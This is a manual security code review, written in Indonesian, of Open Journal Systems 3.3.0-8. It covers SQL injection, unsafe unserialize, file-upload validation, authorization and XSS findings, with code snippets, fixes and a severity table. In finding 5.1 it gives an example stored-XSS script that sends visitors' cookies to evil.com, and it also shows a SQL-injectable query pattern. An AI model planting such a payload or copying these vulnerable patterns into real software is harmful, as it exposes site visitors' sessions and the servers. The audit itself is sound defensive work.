# Manual Code Review — Titik Rawan Historis (OJS 3.3.0-8)

## File yang Direview

| No  | File                                                  | Fokus Review                               |
| --- | ----------------------------------------------------- | ------------------------------------------ |
| 1   | `lib/pkp/classes/db/DAO.inc.php`                      | Akses database, potensi SQL Injection      |
| 2   | `classes/security/authorization/`                     | Logic otorisasi (3 file policy)            |
| 3   | `lib/pkp/classes/file/FileManager.inc.php`            | File upload validation (upload core)       |
| 3   | `lib/pkp/classes/file/TemporaryFileManager.inc.php`   | File upload validation (upload submission) |
| 4   | `plugins/generic/tinymce/TinyMCEPlugin.inc.php`       | Plugin pihak ketiga, attack surface        |
| 5   | `lib/pkp/classes/template/PKPTemplateManager.inc.php` | Template rendering, XSS risk               |

> **Catatan:** File `classes/submission/SubmissionFileManager.inc.php` yang tercantum di instruksi awal **tidak ditemukan** di working copy. Penggantinya adalah `FileManager.inc.php` dan `TemporaryFileManager.inc.php`.

---

## FILE 1 — `lib/pkp/classes/db/DAO.inc.php`

---

### [1.1] ❌ BERBAHAYA — Potensi SQL Injection: `retrieve()` & `update()`

> Baris 52–66, 125–139

Metode `retrieve()` dan `update()` menerima `$sql` mentah lalu meneruskannya ke `Capsule::raw($sql)` — yang tidak mem-enforce penggunaan placeholder (`?`). Jika caller mengonstruksi `$sql` dengan interpolasi variabel input user, SQL Injection terjadi.

```php
// ❌ BERBAHAYA: SQL tanpa prepared statement (pola caller yang salah)
$username = $_GET['username'];
$result = $this->retrieve(
    "SELECT * FROM users WHERE username = '$username'"
    // ← tidak ada parameter $params, injeksi langsung ke $sql
);

// Kode aktual DAO.inc.php baris 65 — raw($sql) tidak ada proteksi:
return Capsule::cursor(Capsule::raw($sql), $params);
```

```php
// ✅ AMAN: Cara yang benar — gunakan placeholder dan $params terpisah
$result = $this->retrieve(
    'SELECT * FROM users WHERE username = ?',
    [$username]   // ← value dipisah, driver handle escaping
);
```

---

### [1.2] ❌ BERBAHAYA — SQL Injection: `countRecords()` — Subquery Concatenation

> Baris 103–106

```php
// ❌ BERBAHAYA: $sql caller dikoncatenasi langsung ke subquery
// Kode aktual DAO.inc.php baris 104:
$result = $this->retrieve(
    'SELECT COUNT(*) AS row_count FROM (' . $sql . ') AS count_subquery',
    $params
);
// Jika $sql dari caller sudah mengandung input user mentah,
// pembungkus subquery ini tidak menghilangkan risikonya.
```

---

### [1.3] ❌ BERBAHAYA — SQL Injection: `concat()` — Identifier Tanpa Escaping

> Baris 113–115

```php
// ❌ BERBAHAYA: Nama kolom dikoncatenasi tanpa escaping
// Kode aktual DAO.inc.php baris 114:
public function concat(...$args) {
    return 'CONCAT(' .  join(',', $args) . ')';
}
// Jika caller memasukkan nama kolom dari input user,
// bisa memodifikasi struktur query CONCAT.
```

---

### [1.4] ❌ BERBAHAYA — SQL Injection: `updateDataObjectSettings()`

> Baris 459–467

```php
// ❌ BERBAHAYA: $tableName dan $idField dikoncatenasi ke query DELETE
// Kode aktual DAO.inc.php baris 459–466:
foreach ($idArray as $idField => $idValue) {
    if (!empty($removeWhere)) $removeWhere .= ' AND ';
    $removeWhere .= $idField . ' = ?';   // ← nama kolom masuk SQL langsung
    $removeParams[] = $idValue;           // ← nilai sudah aman via placeholder
}
$removeSql = 'DELETE FROM ' . $tableName . ' WHERE ' . $removeWhere;
// $tableName dikoncatenasi → jika bisa dikontrol: DROP TABLE / injeksi nama tabel
```

```php
// ✅ AMAN: Nilai ($idValue) sudah menggunakan bound parameter
$removeWhere .= $idField . ' = ?';
$removeParams[] = $idValue;   // ← ini sudah benar
```

---

### [1.5] ❌ BERBAHAYA — SQL Injection: `getDataObjectSettings()`

> Baris 478–486

```php
// ❌ BERBAHAYA: $tableName dan $idFieldName diinterpolasi ke SQL string
// Kode aktual DAO.inc.php baris 479–485:
function getDataObjectSettings($tableName, $idFieldName, $idFieldValue, $dataObject) {
    if ($idFieldName !== null) {
        $sql = "SELECT * FROM $tableName WHERE $idFieldName = ?";  // ← interpolasi!
        $params = [$idFieldValue];
    } else {
        $sql = "SELECT * FROM $tableName";                          // ← interpolasi!
        $params = [];
    }
}
```

```php
// ✅ AMAN: $idFieldValue sudah menggunakan bound parameter (?)
// Tapi $tableName dan $idFieldName seharusnya divalidasi via whitelist terlebih dahulu.
```

---

### [1.6] ❌ BERBAHAYA — PHP Object Injection via `unserialize()`

> Baris 245–253

```php
// ❌ BERBAHAYA: Unserialize data dari database tanpa filter allowed_classes
// Kode aktual DAO.inc.php baris 247–253:
case 'object':
case 'array':
    $decodedValue = json_decode($value, true);
    // FIXME: pkp/pkp-lib#6250 Remove after 3.3.x upgrade code is removed
    if (!is_null($decodedValue)) {
        $value = $decodedValue;
    } else {
        $value = unserialize($value);   // ← data dari DB di-unserialize tanpa filter!
    }
    break;
// RISIKO: Jika setting_value bisa dimanipulasi attacker → PHP Object Injection → RCE
```

```php
// ✅ AMAN: Seharusnya membatasi kelas yang diizinkan
$value = unserialize($value, ['allowed_classes' => false]);
// Atau lebih baik: hapus seluruh else branch setelah migrasi 3.3.x selesai
```

---

### [1.7] ⚠️ PERHATIAN — `datetimeToDB()` Menghasilkan Raw SQL String

> Baris 189–193

```php
// ⚠️ KURANG BAIK: Fungsi mengembalikan string dengan tanda kutip SQL
// Kode aktual DAO.inc.php baris 189–192:
function datetimeToDB($dt) {
    if ($dt === null) return 'NULL';                         // ← literal SQL
    if (!ctype_digit($dt)) $dt = strtotime($dt);
    return '\'' . date('Y-m-d H:i:s', $dt) . '\'';         // ← 'Y-m-d H:i:s'
}
// Desain yang mendorong pola raw SQL string — berbahaya jika diikuti
// kode yang menggunakan hasil ini tanpa prepared statement.
```

---

## FILE 2 — `classes/security/authorization/` (3 file policy)

---

### [2.1] ❌ BERBAHAYA — IDOR Risk: Missing Integer Cast pada `_args[0]`

> `OjsIssueRequiredPolicy.inc.php`, Baris 81–83

```php
// ❌ BERBAHAYA: $this->_args[0] dikembalikan TANPA integer casting
// Kode aktual OjsIssueRequiredPolicy.inc.php baris 81–83:
} else if (isset($this->_args[0])) {
    return $this->_args[0];   // ← tidak ada (int) casting!
}
```

```php
// ✅ AMAN: path via getUserVar() sudah aman — baris 78–80
if ( ctype_digit((string) $this->_request->getUserVar($this->_parameterName)) ) {
    return (int) $this->_request->getUserVar($this->_parameterName);
}
// Inkonsistensi ini memungkinkan string non-numerik masuk via path _args
```

---

### [2.2] ⚠️ PERHATIAN — Loose Comparison (`==`) pada Mode Publikasi

> `OjsJournalMustPublishPolicy.inc.php`, Baris 54

```php
// ❌ KURANG BAIK: Perbandingan tidak ketat (== bukan ===)
// Kode aktual OjsJournalMustPublishPolicy.inc.php baris 54:
if ($this->_context->getData('publishingMode') == PUBLISHING_MODE_NONE) {
    return AUTHORIZATION_DENY;
}
// Jika PUBLISHING_MODE_NONE = 0, nilai falsy (null, '', false) juga match
// → potensi false-positive deny yang tidak diinginkan
```

```php
// ✅ AMAN: Seharusnya strict comparison
if ($this->_context->getData('publishingMode') === PUBLISHING_MODE_NONE) {
    return AUTHORIZATION_DENY;
}
```

---

### [2.3] ✅ AMAN — Integer Cast + Object Ownership Validation

> `OjsIssueGalleyRequiredPolicy.inc.php`, Baris 35–46

```php
// ✅ AMAN: ID di-cast ke integer sebelum digunakan
$issueGalleyId = (int)$this->getDataObjectId();
if (!$issueGalleyId) return AUTHORIZATION_DENY;

// ✅ AMAN: Validasi kepemilikan objek — galley HARUS milik issue yang benar
$issueGalley = $issueGalleyDao->getById($issueGalleyId, $issue->getId());
if (!is_a($issueGalley, 'IssueGalley')) return AUTHORIZATION_DENY;
// Mencegah IDOR: user tidak bisa akses galley milik journal lain
```

---

### [2.4] ✅ AMAN — Role-Based Access Control pada Konten Belum Terbit

> `OjsIssueRequiredPolicy.inc.php`, Baris 50–61

```php
// ✅ AMAN: Konten draft hanya bisa diakses role tertentu
$userRoles = $this->getAuthorizedContextObject(ASSOC_TYPE_USER_ROLES);
if (!$issue->getPublished() && count(array_intersect(
    $userRoles,
    array(ROLE_ID_SITE_ADMIN, ROLE_ID_MANAGER, ROLE_ID_SUB_EDITOR, ROLE_ID_ASSISTANT)
))==0) {
    return AUTHORIZATION_DENY;   // ← public user tidak bisa lihat draft
}
```

---

## FILE 3 — `lib/pkp/classes/file/FileManager.inc.php` & `TemporaryFileManager.inc.php`

> Pengganti: `classes/submission/SubmissionFileManager.inc.php` (tidak ditemukan)

---

### [3.1] ❌ BERBAHAYA — File Upload Tanpa Validasi MIME / Ekstensi

> `FileManager.inc.php`, Baris 136–146

```php
// ❌ BERBAHAYA: uploadFile() menerima file apapun tanpa cek tipe/ekstensi
// Kode aktual FileManager.inc.php baris 136–146:
function uploadFile($fileName, $destFileName) {
    $destDir = dirname($destFileName);
    if (!$this->fileExists($destDir, 'dir')) {
        $this->mkdirtree($destDir);
    }
    if (!isset($_FILES[$fileName])) return false;
    if (move_uploaded_file($_FILES[$fileName]['tmp_name'], $destFileName))
        return $this->setMode($destFileName, FILE_MODE_MASK);
    return false;
}
// TIDAK ADA validasi ekstensi, MIME type, atau ukuran di sini.
// Validasi sepenuhnya bergantung pada caller — sangat mudah terlewat.
```

```php
// ✅ AMAN: Pola yang benar (dilakukan oleh caller PKPUploadPublicFileHandler)
$allowedFileTypes = ['gif', 'jpg', 'png'];
if (!in_array($extension, $allowedFileTypes)) {
    return $response->withStatus(400)->withJsonError('...');
}
```

---

### [3.2] ❌ BERBAHAYA — `getUploadedFileType()` Fallback ke Header Browser

> `FileManager.inc.php`, Baris 114–128

```php
// ❌ BERBAHAYA: Validasi file upload hanya cek ekstensi dari nama file
// Kode aktual FileManager.inc.php baris 114–127:
function getUploadedFileType($fileName) {
    if (isset($_FILES[$fileName])) {
        $exploded = explode('.', $_FILES[$fileName]['name']);
        $type = PKPString::mime_content_type(
            $_FILES[$fileName]['tmp_name'],   // lokasi server
            array_pop($exploded)              // ekstensi dari nama file client
        );
        if (!empty($type)) return $type;
        return $_FILES[$fileName]['type'];    // ← fallback ke header MIME dari browser!
    }
}
// MASALAH: $_FILES[$fileName]['type'] diset oleh BROWSER, bukan server.
// Attacker bisa mengirim file PHP dengan Content-Type: image/jpeg
// dan fungsi ini akan mengembalikan 'image/jpeg' (palsu).
```

---

### [3.3] ❌ BERBAHAYA — `parseFileExtension()` Blacklist Tidak Komprehensif

> `FileManager.inc.php`, Baris 550–567

```php
// ❌ KURANG AMAN: Cek "evil" hanya menyaring kata 'php' — tidak komprehensif
// Kode aktual FileManager.inc.php baris 556–558:
// FIXME Check for evil
if (!isset($fileExtension) || stristr($fileExtension, 'php') || strlen($fileExtension) > 6
      || !preg_match('/^\w+$/', $fileExtension)) {
    $fileExtension = 'txt';
}
// MASALAH: Blacklist berbasis kata 'php' tidak menangkap:
//   - .phtml, .php5, .php7, .phar  (eksekusi PHP di banyak konfigurasi server)
//   - .htaccess                     (bisa digunakan untuk override server config)
//   - .svg                          (XSS via inline SVG)
```

```php
// ✅ AMAN: Seharusnya menggunakan whitelist bukan blacklist
$allowedExtensions = ['pdf', 'doc', 'docx', 'txt', 'jpg', 'png', 'gif'];
if (!in_array(strtolower($fileExtension), $allowedExtensions)) {
    $fileExtension = 'txt';
}
```

---

### [3.4] ⚠️ PERHATIAN — `TemporaryFileManager`: Tidak Ada Validasi Ekstensi

> `TemporaryFileManager.inc.php`, Baris 81–112

```php
// ❌ Kurang aman: handleUpload() tidak memvalidasi tipe file
// Kode aktual TemporaryFileManager.inc.php baris 81–112:
function handleUpload($fileName, $userId) {
    $fileExtension = $this->parseFileExtension($this->getUploadedFileName($fileName));
    // ← hanya ambil ekstensi, TIDAK ada whitelist/blacklist di sini

    $newFileName = basename(tempnam($this->getBasePath(), $fileExtension));
    if ($this->uploadFile($fileName, $this->getBasePath() . $newFileName)) {
        // ... simpan ke DB, return TemporaryFile
    }
}
// Validasi tipe file sepenuhnya diserahkan ke parseFileExtension() yang
// hanya memblokir kata 'php' — tidak cukup aman (lihat temuan 3.3).
```

---

### [3.5] ✅ AMAN — `is_uploaded_file()` Digunakan Sebelum Proses File

> `FileManager.inc.php`, Baris 49–55 dan 90–95

```php
// ✅ AMAN: Verifikasi bahwa file benar-benar hasil upload HTTP (bukan file lokal)
function uploadedFileExists($fileName) {
    if (isset($_FILES[$fileName]) && isset($_FILES[$fileName]['tmp_name'])
            && is_uploaded_file($_FILES[$fileName]['tmp_name'])) {
        return true;   // ← is_uploaded_file() mencegah path traversal attack
    }
    return false;
}
// is_uploaded_file() memastikan file adalah hasil upload HTTP yang sah,
// mencegah attacker memanipulasi tmp_name untuk mengakses file server lain.
```

---

### [3.6] ✅ AMAN — `move_uploaded_file()` Digunakan untuk Memindahkan File

> `FileManager.inc.php`, Baris 143

```php
// ✅ AMAN: move_uploaded_file() lebih aman daripada copy() atau rename()
if (move_uploaded_file($_FILES[$fileName]['tmp_name'], $destFileName))
// move_uploaded_file() hanya memindahkan file yang benar-benar hasil
// upload HTTP — tidak bisa dieksploitasi untuk memindahkan file sembarang.
```

---

## FILE 4 — `plugins/generic/tinymce/TinyMCEPlugin.inc.php`

---

### [4.1] ❌ BERBAHAYA — Plugin Tidak Bisa Dinonaktifkan (No Kill Switch)

> Baris 50–52

```php
// ❌ BERBAHAYA: Kill switch dimatikan — admin tidak bisa merespons CVE
// Kode aktual TinyMCEPlugin.inc.php baris 50–52:
function getCanDisable() {
    return false;   // ← plugin TIDAK bisa dinonaktifkan via UI admin
}
// Jika versi TinyMCE yang digunakan memiliki CVE XSS, admin tidak bisa
// menonaktifkan sebagai mitigasi darurat.
```

```php
// ✅ AMAN: Seharusnya diubah ke:
function getCanDisable() {
    return true;
}
```

---

### [4.2] ✅ AMAN — Data Plugin Dikodekan dengan `json_encode()`

> Baris 90–98

```php
// ✅ AMAN: Data didaftarkan ke frontend via json_encode — tidak ada raw output
$templateManager->addJavaScript(
    'tinymceData',
    '$.pkp.plugins.generic = $.pkp.plugins.generic || {};' .
        '$.pkp.plugins.generic.' . strtolower(get_class($this)) .
        ' = ' . json_encode($data) . ';',   // ← json_encode mencegah JS injection
    ['inline' => true, 'contexts' => 'backend']
);
```

---

## FILE 5 — `lib/pkp/classes/template/PKPTemplateManager.inc.php`

---

### [5.1] ❌ BERBAHAYA — Stored XSS via `customHeaders` tanpa Sanitasi

> Baris 223–227

```php
// ❌ BERBAHAYA: Output tanpa escaping — data DB langsung ke HTML <head>
// Kode aktual PKPTemplateManager.inc.php baris 223–227:
$customHeaders = $currentContext->getLocalizedData('customHeaders');
if (!empty($customHeaders)) {
    $this->addHeader('customHeaders', $customHeaders);   // ← tidak ada escaping!
}
// Stored XSS: Admin jurnal jahat atau akun yang dikompromis bisa menyimpan:
// <script>document.location='https://evil.com/?c='+document.cookie</script>
// → Script dieksekusi di browser SEMUA pengunjung
```

```php
// ✅ AMAN: Seharusnya melalui sanitasi sebelum output
$customHeaders = PKPString::stripUnsafeHtml($customHeaders);
$this->addHeader('customHeaders', $customHeaders);
```

---

### [5.2] ❌ BERBAHAYA — `searchDescription` ke Meta Tag Tanpa Escaping

> Baris 211–213

```php
// ❌ BERBAHAYA: Output tanpa escaping dikoncatenasi ke HTML attribute
// Kode aktual PKPTemplateManager.inc.php baris 211–212:
$this->addHeader('searchDescription',
    '<meta name="description" content="' .
    $currentContext->getLocalizedData('searchDescription') .   // ← tanpa htmlspecialchars!
    '">');
// Jika searchDescription mengandung karakter " → bisa break out dari atribut
```

```php
// ✅ AMAN: Seharusnya menggunakan htmlspecialchars()
$this->addHeader('searchDescription',
    '<meta name="description" content="' .
    htmlspecialchars(
        $currentContext->getLocalizedData('searchDescription'),
        ENT_QUOTES, 'UTF-8'
    ) .
    '">');
```

---

### [5.3] ⚠️ PERHATIAN — `error_reporting` Mematikan E_WARNING

> Baris 97

```php
// ❌ KURANG BAIK: Warning disembunyikan di level template engine
// Kode aktual PKPTemplateManager.inc.php baris 97:
$this->error_reporting = E_ALL & ~E_NOTICE & ~E_WARNING;
// E_WARNING yang disembunyikan bisa menyembunyikan bug logika berbahaya
// yang seharusnya ditangani secara eksplisit.
```

---

### [5.4] ✅ AMAN — `strip_unsafe_html` Terdaftar sebagai Smarty Modifier

> Baris 252

```php
// ✅ AMAN: Modifier sanitasi HTML tersedia untuk semua template
$this->registerPlugin('modifier', 'strip_unsafe_html', 'PKPString::stripUnsafeHtml');
$this->registerPlugin('modifier', 'escape', [$this, 'smartyEscape']);
// Template .tpl yang menggunakan {$var|escape} atau {$var|strip_unsafe_html}
// sudah terlindungi dari XSS. Masalah hanya pada output PHP langsung (bukan Smarty).
```

---

### [5.5] ✅ AMAN — Default Cache-Control: `no-store`

> Baris 90

```php
// ✅ AMAN: Default cache diset ke paling aman (no-store)
$this->_cacheability = CACHEABILITY_NO_STORE; // Safe default
// Mencegah browser/proxy menyimpan cache halaman dengan data sensitif.
```

---

## Tabel Ringkasan Temuan

| ID  | Severity    | File                                   | Temuan                        |
| --- | ----------- | -------------------------------------- | ----------------------------- |
| 1.6 | 🔴 KRITIKAL | `DAO.inc.php`                          | `unserialize()` tanpa filter  |
| 5.1 | 🔴 KRITIKAL | `PKPTemplateManager.inc.php`           | Stored XSS customHeaders      |
| 3.1 | 🟠 TINGGI   | `FileManager.inc.php`                  | Upload tanpa validasi         |
| 3.2 | 🟠 TINGGI   | `FileManager.inc.php`                  | MIME type dari browser        |
| 3.3 | 🟠 TINGGI   | `FileManager.inc.php`                  | Blacklist `.php` tidak cukup  |
| 1.4 | 🟠 TINGGI   | `DAO.inc.php`                          | `$tableName` concat SQL       |
| 1.5 | 🟠 TINGGI   | `DAO.inc.php`                          | `$tableName` interpolasi SQL  |
| 1.1 | 🟡 MENENGAH | `DAO.inc.php`                          | `raw($sql)` tanpa enforcement |
| 1.2 | 🟡 MENENGAH | `DAO.inc.php`                          | Subquery concatenation        |
| 1.3 | 🟡 MENENGAH | `DAO.inc.php`                          | `concat()` identifier         |
| 2.1 | 🟡 MENENGAH | `OjsIssueRequiredPolicy.inc.php`       | IDOR missing `(int)` cast     |
| 3.4 | 🟡 MENENGAH | `TemporaryFileManager.inc.php`         | Tanpa whitelist ekstensi      |
| 4.1 | 🟡 MENENGAH | `TinyMCEPlugin.inc.php`                | No kill switch                |
| 5.2 | 🟡 MENENGAH | `PKPTemplateManager.inc.php`           | XSS meta tag                  |
| 1.7 | 🔵 RENDAH   | `DAO.inc.php`                          | Raw SQL string return         |
| 2.2 | 🔵 RENDAH   | `OjsJournalMustPublishPolicy.inc.php`  | Loose `==` comparison         |
| 5.3 | 🔵 RENDAH   | `PKPTemplateManager.inc.php`           | E_WARNING dimatikan           |
| 2.3 | ✅ AMAN     | `OjsIssueGalleyRequiredPolicy.inc.php` | `(int)` cast + `is_a()`       |
| 2.4 | ✅ AMAN     | `OjsIssueRequiredPolicy.inc.php`       | RBAC benar                    |
| 3.5 | ✅ AMAN     | `FileManager.inc.php`                  | `is_uploaded_file()`          |
| 3.6 | ✅ AMAN     | `FileManager.inc.php`                  | `move_uploaded_file()`        |
| 4.2 | ✅ AMAN     | `TinyMCEPlugin.inc.php`                | `json_encode()` data          |
| 5.4 | ✅ AMAN     | `PKPTemplateManager.inc.php`           | `strip_unsafe_html` modifier  |
| 5.5 | ✅ AMAN     | `PKPTemplateManager.inc.php`           | `CACHEABILITY_NO_STORE`       |

**Total:** 🔴 Kritikal: 2 &nbsp;|&nbsp; 🟠 Tinggi: 5 &nbsp;|&nbsp; 🟡 Menengah: 7 &nbsp;|&nbsp; 🔵 Rendah: 3 &nbsp;|&nbsp; ✅ Aman: 7
